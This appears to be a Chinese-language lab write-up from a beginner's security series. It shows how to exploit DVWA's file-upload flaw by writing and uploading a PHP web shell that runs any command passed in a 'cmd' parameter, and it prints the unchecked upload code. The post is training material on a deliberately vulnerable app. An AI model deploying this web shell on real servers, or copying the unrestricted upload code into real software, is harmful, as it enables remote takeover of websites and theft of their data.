---
title: "【開局地端紅隊小白與雲端資安的清晨Punch】Day13 DVWA 使用(File Uploade Attack)"
date: 2025-12-25
tags: [dvwa, 資訊安全]
categories: 技術文章
source: https://ithelp.ithome.com.tw/articles/10345882
---

# 陸、Usage(使用方式)---File Uploade Attack

參考:[Metasploitable 學習筆記-文件上傳漏洞( file upload) & Reverse Shell](https://medium.com/blacksecurity/metasploitable-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-web%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6%E5%9F%BA%E7%A4%8E%E8%88%87%E6%96%87%E4%BB%B6%E4%B8%8A%E5%82%B3%E6%BC%8F%E6%B4%9E-557d6392eefe): 包含reverse shell

## 一、網頁正常行為描述

可以選擇檔案並上傳(預設應該是一個傳照片的系統)

![image](https://hackmd.io/_uploads/HyG0svHRp.png)

## 二、創建backdoor.php檔(欲植入後門)

用vim新增檔案
vim simple-backdoor.php

- 按i進入編輯模式，輸入檔案內容

```
<?php

if(isset($_REQUEST['cmd'])){

                              echo "<pre>";

                              $cmd = ($_REQUEST['cmd']);

                              system($cmd);

                              echo "</pre>";

                              die;

}

?>
```

![image](https://hackmd.io/_uploads/S1SQArSAT.png)

- 按esc退出編輯模式，並輸入:wq保存結果

![image](https://hackmd.io/_uploads/BykrRBr0a.png)

## 三、上傳後門 & 驗證漏洞

- 到DVWA --> File Upload --> 選擇檔案simple-backdoor.php並上傳

- 標示起來的地方代表上傳的檔案路徑

![image](https://hackmd.io/_uploads/HkWk-USRT.png)

### 1. Server後端觀察檔案路徑:　Find指令

參考: [如何在 Linux 终端高效搜索文件——高级指南](https://www.freecodecamp.org/chinese/news/how-to-search-files-effectively-in-linux/)
參考 [30日Linux學習系列 第 29 篇 Linux find指令](https://ithelp.ithome.com.tw/articles/10210474)

- 範例輸入: sudo find / -type d -name "<資料夾名稱>"可以搜尋該資料夾路徑(d 代表目錄，可以找到dvwa資料夾路徑

![image](https://hackmd.io/_uploads/S1cv2pejC.png)

- 輸入sudo -i，切換權限

- 輸入sudo find / -type d -name "hackable" ，尋找剛剛上傳資料夾的裸露路徑

![image](https://hackmd.io/_uploads/H1iFhali0.png)

移動路徑到hackable資料夾: cd /var/lib/docker/overlay2/414d260a84338dc69c8df81cb7c00e1e7b2113299390ee1aac99b75474336164/diff/var/www/html/hackable root@ip-172-31-52-110:/var/lib/docker/overlay2/414d260a84338dc69c8df81cb7c00e1e7b2113299390ee1aa

![image](https://hackmd.io/_uploads/rk0p2TgsC.png)

ls 印出檔案 --> 觀察到有 uploads

cd uploads

ls 檢查內部檔案

ls -al 顯示隱藏的檔案，驗證攻擊(可讀取敏感資訊)

[Linux 的 ls 指令教學與常用範例整理](https://blog.gtwang.org/linux/linux-ls-command-tutorial/)

![image](https://hackmd.io/_uploads/H1Pb6TgsA.png)

### 2. Web Bash驗證

觀察輸入網址，得到路徑為../../hackable/uploads/simple-backdoor.php

- 兩次../../代表前兩層資料夾已包含，可以省略，故從http://127.0.0.1/DVWA/直接往後接即可

輸入網址: [http://127.0.0.1/DVWA/hackable/uploads/simple-backdoor.php?cmd=ls](http://127.0.0.1/DVWA/hackable/uploads/simple-backdoor.php?cmd=ls)

後面接上指令?cmd=ls，即可達成web bash的效果驗證，可直接執行terminal並可以達成

![image](https://hackmd.io/_uploads/S1cD7DSCa.png)

## 四、Source Code分析

### 1. Low

![image](https://hackmd.io/_uploads/rkSUYFrRp.png)

- 可以看到在檔案部分並沒有對格式加以限制!!

```
<?php

if( isset( $_POST[ 'Upload' ] ) ) { // 檢查是否有 'Upload' 按鈕被按下
    // 我們將要寫入的目標路徑是哪裡？
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; // 設定目標路徑
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // 取得上傳檔案的名稱並附加到目標路徑上

    // 我們能將檔案移動到上傳的資料夾嗎？
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // 如果無法移動檔案
        // 否
        echo '<pre>您的圖片未上傳成功。</pre>'; // 輸出錯誤訊息
    }
    else {
        // 是的！
        echo "<pre>{$target_path} 上傳成功！</pre>"; // 輸出成功上傳訊息
    }
}

?>
```

### 2. Medium

![image](https://hackmd.io/_uploads/H1BOKYrR6.png)

### 3. High

![image](https://hackmd.io/_uploads/Hk6tFFSCa.png)

### 4. Impossible

![image](https://hackmd.io/_uploads/ryy2YFHRp.png)

![image](https://hackmd.io/_uploads/Hka2YKB06.png)

## 五、可能危害

可以從web shell傳送terminal指令，達成reverse shell，為高危險層級的漏洞

檔案上傳漏洞的常見類型包括：

- 任意檔案上傳：攻擊者可以上傳任何類型的檔案，包括可執行檔案、腳本檔案、圖片檔案等。

- 檔案包含漏洞：攻擊者可以上傳包含惡意程式碼的檔案，例如 PHP 腳本檔案，當該檔案被執行時，惡意程式碼將被執行。

- 後門上傳：攻擊者可以上傳包含後門的 Webshell 檔案，當該檔案被訪問時，攻擊者可以獲得對網站的控制。

檔案上傳漏洞的危害包括：

- 攻擊者可以獲得對網站的控制：攻擊者可以利用檔案上傳漏洞上傳惡意檔案，以獲得對網站的控制。

- 攻擊者可以讀取敏感資料：攻擊者可以利用檔案上傳漏洞上傳惡意檔案，以讀取網站的敏感資料，例如使用者帳號密碼、信用卡資訊等。

- 攻擊者可以植入惡意軟體：攻擊者可以利用檔案上傳漏洞上傳惡意檔案，以植入惡意軟體到網站，例如木馬、病毒等。
